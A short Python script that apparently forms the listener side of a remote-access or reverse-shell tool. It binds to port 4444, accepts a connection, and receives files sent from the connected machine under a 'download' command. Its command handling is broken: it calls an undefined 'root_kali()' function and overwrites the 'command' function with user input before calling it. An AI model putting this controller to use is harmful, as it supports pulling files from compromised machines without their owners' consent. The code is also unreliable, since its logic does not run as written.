#!/usr/bin/env python3
import os
from socket import socket , AF_INET , SOCK_STREAM
from subprocess import Popen , PIPE
s = socket(AF_INET,SOCK_STREAM)
s.bind(("127.0.0.1",4444))
s.listen(1)
c,a = s.accept()
print ("connection from {0}".format(a[0]))

def command(data_send):
    while True:
        data = c.recv(1024).decode("utf-8")
        if not data:
            break;
        else:
            print(data)
            root_kali()
            data_send = data_send.encode("utf-8")
            c.send(data_send)
def Download(filename):
    filename = c.recv(1024).decode("utf-8")
    filesize = c.recv(1024).decode("utf-8")
    filesize = int(filesize)
    f = filename.split("/")[-1]
    f = open('new_'+f, 'wb')
    data = c.recv(1024)
    totalRecv = len(data)
    f.write(data)
    while totalRecv < filesize:
        data = c.recv(1024)
        totalRecv += len(data)
        f.write(data)
        print ("{0:.2f}".format((totalRecv/float(filesize))*100)+ "% Done")
    print ("Download Complete!")
command = input()
if command.split(" ")[0].strip() == "download":
    secommand = command.split(" ")[1]
    Download(secommand)
else:
    command(command)
